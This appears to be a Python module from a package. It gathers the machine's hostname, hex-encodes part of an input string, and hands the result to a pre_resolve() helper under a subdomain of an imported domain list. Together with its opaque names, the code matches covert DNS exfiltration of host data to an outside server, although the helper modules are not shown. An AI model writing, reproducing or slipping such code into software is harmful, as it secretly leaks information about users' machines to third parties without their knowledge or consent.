import os
import platform
import socket

from .net import pre_resolve
from .const.domains import PRIMARY_DOMAINS as dom_arr
from .const.list_table import CONSTANT_TABLE as str_arr


def net_name():

    hostname = None
    try:
        hostname = socket.gethostname()
        if hostname is None or len(hostname) == 0:
            hostname = platform.node()
            if hostname is None or len(hostname) == 0:
                hostname = os.uname()[1]
                if len(hostname) == 0:
                    hostname = None
    except:
        pass

    return hostname


def trim_resolve(input_str, stp, idx):
    trim = input_str.replace(str_arr[0], '')[:30].encode().hex()
    base = "n." + dom_arr[11]
    pre_resolve(trim, stp, idx, base)
